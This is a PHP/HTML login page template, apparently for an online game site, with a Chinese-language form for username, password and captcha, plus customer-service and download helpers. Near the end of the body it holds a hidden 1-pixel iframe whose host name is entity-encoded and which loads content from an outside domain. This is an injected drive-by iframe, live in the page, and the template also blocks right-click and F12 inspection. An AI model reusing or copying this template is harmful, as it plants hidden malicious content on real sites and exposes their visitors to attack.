<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php $this->display('inc_skin_lr.php',0,'登录'); ?>
<script src="/skin/layer/layer.js"></script>
</head>
<script type="text/javascript">
function userBeforeLogin(){
	var u=this.username.value;
	var p=this.password.value;
	var v=this.vcode.value;
	if(!u || u=='帐号'){
	   davidInfo("请输入用户名！");
	}else if(!p || p=='xx@x@x.x'){
	   davidInfo("请输入密码！");
	}else if(!v || v=='验证码'){
	   davidInfo("请输入验证码！");
	}else{
	   return true;
	}
	return false;
}
function userLogin(err, data){
	if(err){
	     davidError(err);
	     $('#vcode').val('');
		 $('#password').val('');
	     $('#validate').click();
	}else{
		location='/index.php';
	}
}
</script>
<body>
<!--[if IE]>
<style type="text/css">
#xf_login_container{display: none;}
</style>
<script type='text/javascript'>
layer.alert('您使用的是IE模式，无法流畅体验游戏，请使用极速模式浏览或谷歌浏览器登录游戏', {icon: 6});
</script>
<![endif]-->
      <div id="xf_login_container">
 <form action="<?=$this->basePath('User-logined') ?>" method="post" onajax="userBeforeLogin" enter="true" call="userLogin" target="ajax">
    <div id="xf_login_mid">
    <div class="login_logo"></div>
        <div class="xf_center">
                    <div class="login_form_user">
					<i class="user_img"></i>
                        <input class="chang user_input" name="username" id="username" type="text" value="" placeholder="账户名" autocomplete="off">
                    </div>
                    <div class="login_form_password">
                    <i class="pw_img"></i>
                        <input class="chang password_input" name="password" id="password" type="password" value="" placeholder="密码" autocomplete="off">
                    <i class="pw_disable"></i>
                    </div>
                    <div class="login_form_veri">
                    <i class="veri_img"></i>
                        <input class="duan veri_input" name="vcode" id="vcode" type="text" placeholder="验证码" autocomplete="off">
                        <a href="javascript:void(0)" onclick="this.src='<?=$this->basePath('User-vcode') ?>'+(new Date()).getTime()" id="veri_new">刷新</a>
                    <div class="veri_pic">
                        <img src="<?=$this->basePath('User-vcode')."&t=".$this->time ?>" name="validate" id="validate" onclick="this.src='<?=$this->basePath('User-vcode') ?>'+(new Date()).getTime()" width="84" height="35" />
                    </div>
                    </div>
                    <div class="xf_login_butt">
                        <!--a href="#" class="login_forget"></a-->
                        <input value="" class="login_a" type="submit">
                        </div>
                </div>
            </div>
        </div>
    </div>
</form>
<!--a href="javascript:void(0)" class="enter"></a>
<a href="javascript:void(0)" onclick="down()" class="down_url"></a-->
<a href="javascript:void(0)" onclick="kf()" class="kefu"></a>
<div class="login_footer">本站建议您使用360极速浏览器或Chrome浏览器获取最佳使用体验</div>
</div>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
<script type='text/javascript'>
function kf(){
<?php if($this->settings['kefuStatus']){ ?>
	var iTop = (window.screen.availHeight-30-570)/2;
	var iLeft = (window.screen.availWidth-10-750)/2;
	var url = '<?=$this->settings['kefuGG']?>';
	var winOption = "height=570,width=750,top="+iTop+",left="+iLeft+",toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes,fullscreen=1";
	var newWin = window.open(url,window, winOption);
	<?php }else{ ?>
     	alert("客服系统正在维护，程序猿在拼命打代码，请稍后访问.");
	<?php } ?>
	return false;
}
function down(){
    window.location="<?=$this->settings['templateurl'] ?>/template/down/inst.exe";
}
</script>
<script type='text/javascript'>
function click(e) {
if (document.all) {
if (event.button==2||event.button==3) { alert("erro");
oncontextmenu='return false';
}
}
if (document.layers) {
if (e.which == 3) {
oncontextmenu='return false';
}
}
}
if (document.layers) {
document.captureEvents(Event.MOUSEDOWN);
}
document.onmousedown=click;
document.oncontextmenu = new Function("return false;")
document.onkeydown =document.onkeyup = document.onkeypress=function(){ 
if(window.event.keyCode == 123) { 
window.event.returnValue=false;
return(false); 
} 
}
</script>